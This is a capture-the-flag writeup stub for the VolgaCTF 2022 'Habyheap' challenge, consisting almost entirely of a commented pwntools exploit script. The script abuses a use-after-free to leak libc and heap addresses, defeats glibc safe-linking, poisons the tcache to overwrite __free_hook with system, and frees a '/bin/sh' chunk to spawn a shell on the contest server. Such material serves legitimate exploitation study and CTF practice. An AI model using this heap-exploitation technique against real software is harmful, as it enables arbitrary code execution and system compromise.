# Writeup: Habyheap

Will write eventually when I'm not lazy.

Here's the exploit script though.

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./habybeap_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.33.so")

context.terminal = ['tmux','splitw','-h']
context.binary = exe

gdb_script = ''''''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        #if args.DBG:
        #    gdb.attach(p)
    else:
        p = remote("habybeap.q.2022.volgactf.ru", 21337)

    return p
def add_note(index, data):
    p.sendlineafter(b"Input your choice>> ", b'1')
    p.sendlineafter(b"Input your index>> ", str(index))
    p.sendlineafter(b"1 for big, 0 for smol >> ", b'1') # Send big cuz why not.
    p.sendlineafter(b"Input your data>> ", str(data))

def add_small_note(index, data):
    p.sendlineafter(b"Input your choice>> ", b'1')
    p.sendlineafter(b"Input your index>> ", str(index))
    p.sendlineafter(b"1 for big, 0 for smol >> ", b'0') # Send big cuz why not.
    p.sendlineafter(b"Input your data>> ", data)


def edit_note(index, data):
    p.sendlineafter(b"Input your choice>> ", b'2')
    p.sendlineafter(b"Input your index>> ", str(index))
    p.sendlineafter(b"Input your data>> ", data)

def edit_note2(index, data):
    p.sendlineafter(b"Input your choice>> ", b'2')
    p.sendlineafter(b"Input your index>> ", str(index))
    p.sendafter(b"Input your data>> ", data)
 

    
def delete_note(index):
    p.sendlineafter(b"Input your choice>> ", b'3')
    p.sendlineafter(b"Input your index>> ", str(index))

def print_note(index, mode=1):
    p.sendlineafter(b"Input your choice>> ", b'4')
    p.sendlineafter(b"Input your index>> ", str(index))
    if mode == 2:
        p.recvline()
    return p.recvline()

# libc deobf b4 reference. When we wanna spoof, we need to obfuscate
def deobfuscate(addr1, addr2):
    # Actually obfuscating.
    # Workaround against safelink
    # Safe linking is a defense mechanism to prevent tcache poisoning.
    # Tcache poisoning is overriding the tcache forward ptr.
    # With safelinking we need an additional heap pointer to correctly spoof our stuff to get around the safelink mechanism.
    # 
    unobf = addr1 ^ (addr2 >> 12)
    return unobf

def main():
    global p # Make the connection accessable by functions.
    p = conn()
    
    for i in range(1, 12): # make 11
        add_note(i, b'abcd')
    for i in range(1, 11): # delete 10
        if i == 9:
            continue

        delete_note(i)
    # it let us edit 8 cuz UAF.
    edit_note(8, b'') # Kills off null bytes.
    # First leak was libc. 
    leak = print_note(8,2)

    # libc addresses are 6 bytes, so we need to pad to 8.
    # leak was 5 bytes originally. we needed an extra \x00, last 2 were padding.
    leak = b'\x00' + leak[:-1] + b'\x00' + b'\x00'
    leak = u64(leak)
    # [ ] = free
    # first 7 go to tcache. First 7 always go to tcache (just a feature.)
    # IF we free stuff of a different size then we'd have to free 7 more.
    # if we free 7 things of 40, they go to 
    # 9 was there to prevent coalescing. When we free 10, so [8] -> 9 -> [10] -> 11 -> [wilderness]
    # 11 stops 10 from being coalesced.
    # 8 is the first unsorted.
    # Unsorted chunks form a doubly linked list* (maybe). [10] -> [8] -> [libc] 
    # 10 gives us the heap leak. 8 gives us libc.
    leak2 = print_note(10)
    #for i in leak2:
    #    print(hex(i))

    leak2 = leak2[:-1] + b'\x00' + b'\x00'
    #print(leak2)
    leak2 = u64(leak2)
    
    
    print(hex(leak2))
    print(hex(leak))
  

    #for i in leak:
    #    print(hex(i))
    print(f'leak is: {hex(leak)}')
    libc.address = leak - 0x1e0c00 # distance between libc base and our leak.
    print("libc addr: ", hex(libc.address))
    print(f"libc freehook: ", hex(libc.symbols['__free_hook']))
    # free_hook is a pointer to something that gets executed whenever you free. It hooks into free. Nothing is supposed to go in it. It's removed in libc 2.34+ :(
    free_hook = libc.symbols['__free_hook']

    bin_sh = next(libc.search(b'/bin/sh\x00')) # unused.
    print(f'bin sh: {hex(bin_sh)}')
    print(f"system: {hex(libc.symbols['system'])}")
    system = libc.symbols['system']
    # idk what to do now ;-;
    edit_note2(8, b'\x00') # This line and the sleep are a combo.
    # Idea is we write back the null byte to undo our corruption in the unsorted bin chunk. The reason we sleep is b/c read can exit beforehand cuz it might not have gotten all the data. 
    # So we sleep to make sure read will only read 1 byte. That'll stop it cuz it won't expect more data from tcp connection.

    sleep(4)
    add_small_note(12, b'') # This one is here to make sure that our free list is set up correctly to point [b] to [a]. 
    # free list: [b] -> [a] after line 132 (the delete_note(13)) 
    add_small_note(13, b'xxxxxxxxxxxxxxxxxxxxxxx') # Done to search for the x's, we needed this many cuz metadata overrides a lot of our x's

    delete_note(12) # free a

    delete_note(13) # free b
    if args.DBG:
        gdb.attach(p)
    #print("free hook: ", hex(int(p64(free_hook)[0:6], 16)))
    ptr = deobfuscate(free_hook, leak2 + 0x130) # Leak2 + 0x130 is address of b. And the reason we wanted that was to obfuscate the pointer.

    print("ptr :", hex(ptr)) 
    edit_note2(13, p64(ptr)[0:6]) # After this line, free list is: [b] -> free_hook.
    # we can only write 6 bytes. Limitation imposed by program (only let us read 6 bytes)
    # we also don't want it to write a newline.
    #edit_note2(13, b'AAAAAA')
 
    #edit_note(12, b'aaaaaaaa')
    add_small_note(14, b'/bin/sh\x00')
    add_small_note(15, p64(system))
    delete_note(14)
    # The next time we free the note containing /bin/sh 
    # what's happening is we write system into free hook. Allocation on line 142 returns addr of free hook. We write system into free hook so it executes it.
    # instead of free /bin/sh we get free -> system(/bin/sh)

    p.interactive()
    '''
    p.interactive()

    # good luck pwning :)
    '''


if __name__ == "__main__":
    main()
```

## Relevant links
- How2heap glibc 2.33 tcache poisoning [link](https://github.com/shellphish/how2heap/blob/master/glibc_2.33/tcache_poisoning.c) 
- 